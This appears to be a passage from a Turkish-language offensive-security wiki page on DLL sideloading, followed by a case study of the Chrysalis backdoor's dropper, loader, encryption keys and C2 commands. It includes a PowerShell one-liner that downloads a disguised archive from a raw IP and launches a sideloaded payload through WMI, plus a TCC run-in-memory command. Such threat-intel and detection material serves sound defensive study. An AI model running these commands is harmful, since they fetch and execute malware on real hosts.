- **Built-in download/extract:** Zararsız bir uzantısı olan bir arşiv indirin, açın ve sideload hedefini ile DLL'i rastgele bir `%LocalAppData%` klasörü altına yerleştirin:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ilerlemeyi gizler ve yönlendirmeleri takip eder; `tar -xf` Windows'un yerleşik tar'ını kullanır.

- **WMI/CIM launch:** EXE'yi WMI aracılığıyla başlatın, böylece telemetri CIM tarafından oluşturulmuş bir süreç gösterirken yanındaki DLL yüklenir:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Local DLL'leri tercih eden ikili dosyalarla çalışır (ör. `intelbq.exe`, `nearby_share.exe`); payload (ör. Remcos) güvenilen ad altında çalışır.

- **Hunting:** `/p`, `/m` ve `/c` birlikte göründüğünde `forfiles` için uyarı verin; bu kombinasyon yönetici script'leri dışında nadirdir.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Son Lotus Blossom ihlali, güvenilen bir güncelleme zincirini kullanarak NSIS ile paketlenmiş bir dropper teslim etti; bu dropper DLL sideload'ı hazırlayıp tamamen bellekte çalışan payload'lar aşamalı olarak yükledi.

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` oluşturur, klasörü **HIDDEN** yapar, ismi değiştirilmiş bir Bitdefender Submission Wizard `BluetoothService.exe`, kötü amaçlı `log.dll` ve şifreli bir blob `BluetoothService` bırakır, ardından EXE'yi başlatır.
- Host EXE `log.dll`'i import eder ve `LogInit`/`LogWrite` çağırır. `LogInit` blob'u mmap ile yükler; `LogWrite` özel bir LCG tabanlı stream ile (sabitler **0x19660D** / **0x3C6EF35F**, anahtar materyali önceki bir hash'ten türetilir) deşifre eder, buffer'ı plaintext shellcode ile üzerine yazar, geçici verileri serbest bırakır ve oraya atlar.
- IAT'tan kaçınmak için loader, export isimlerini hash'leyerek API'leri çözer (FNV-1a basis 0x811C9DC5 + prime 0x1000193), sonra Murmur-benzeri bir avalanche (**0x85EBCA6B**) uygular ve salt'lanmış hedef hash'lerle karşılaştırır.

Main shellcode (Chrysalis)
- Beş pass boyunca add/XOR/sub tekrarları ile PE-benzeri ana modülü deşifre eder, sonra import çözümü tamamlamak için dinamik olarak `Kernel32.dll` → `GetProcAddress` yükler.
- Çalışma zamanında DLL isimlerini karakter başına bit-rotate/XOR dönüşümleri ile yeniden inşa eder, sonra `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`'yi yükler.
- İkinci bir resolver kullanır: **PEB → InMemoryOrderModuleList** üzerinde gezinir, her export tablosunu 4-bayt bloklarla Murmur-benzeri karıştırma ile çözer ve hash bulunamazsa yalnızca `GetProcAddress`'e geri döner.

Embedded configuration & C2
- Konfigürasyon bırakılan `BluetoothService` dosyası içinde **offset 0x30808**'de (boyut **0x980**) yer alır ve `qwhvb^435h&*7` anahtarı ile RC4 deşifre edilir; bu C2 URL'sini ve User-Agent'i açığa çıkarır.
- Beacon'lar nokta-ile ayrılmış bir host profili oluşturur, başına `4Q` tag'i ekler, sonra `vAuig34%^325hGV` anahtarı ile RC4 şifreleyip HTTPS üzerinden `HttpSendRequestA` kullanır. Yanıtlar RC4 ile deşifre edilir ve tag switch ile yönlendirilir (`4T` shell, `4V` process exec, `4W/4X` dosya yazma, `4Y` okuma/exfil, `4\\` uninstall, `4` sürücü/dosya enum + parça transfer vakaları).
- Çalıştırma modu CLI arg'lerine göre kontrol edilir: arg yok = persistence (service/Run key) kurar ve `-i`'ye işaret eder; `-i` kendini `-k` ile yeniden başlatır; `-k` kurulumu atlar ve payload'u çalıştırır.

Alternate loader observed
- Aynı ihlal Tiny C Compiler bıraktı ve `C:\ProgramData\USOShared\` altından `svchost.exe -nostdlib -run conf.c` çalıştırdı; yanında `libtcc.dll` vardı. Saldırgan tarafından sağlanan C kaynağı shellcode'u gömülü tuttu, derledi ve bir PE'ye dokunmadan bellekte çalıştırdı. Tekrarlamak için:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Bu TCC tabanlı compile-and-run aşaması runtime'ta `Wininet.dll`'i import etti ve ikinci aşama shellcode'u hardcoded bir URL'den çekerek derleyici çalışması gibi görünen esnek bir loader sağladı.

## Referanslar

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
